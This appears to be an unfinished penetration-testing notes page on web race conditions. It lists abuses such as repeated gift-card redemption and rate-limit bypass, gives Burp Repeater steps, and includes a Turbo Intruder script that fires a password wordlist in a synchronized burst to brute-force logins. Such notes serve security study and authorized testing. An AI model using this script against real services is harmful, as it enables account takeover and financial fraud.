# Race conditions

<details>

<summary>Introduction</summary>

Race conditions occurs when websites process requests concurrently without proper safeguards, leading to multiple threads accessing the same data and causing unintended behavior due to "collisions." The timeframe for potential collisions is called the "race window."

**Impact**

* Redeeming a gift card multiple times
* Rating a product multiple times
* Withdrawing or transferring cash in excess of your account balance
* Reusing a single CAPTCHA solution
* Bypassing an anti-brute-force rate limit
* Etc.

</details>

## Detecting and exploiting

Even with simultaneous requests, external factors can unpredictably affect server processing. Burp adjusts techniques automatically.&#x20;

Sending many requests helps reduce server-side jitter, even though only two are needed for exploits.

**With Burp Repeater**

1. Add requests in a group
2. Send group in parallel

**With Turbo Intruder**

1. `Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`
2. Modify the request by replacing the value you want to brute force with `%s`.

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )

    for password in open('/home/francesco/passwords.txt'):
        engine.queue(target.req, password.rstrip(), gate='race1')
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)

```

## Multi-endpoint race windows <a href="#aligning-multi-endpoint-race-windows" id="aligning-multi-endpoint-race-windows"></a>

**Connection warming**

to do

**Abusing rate or resource limits**

to do

\
\
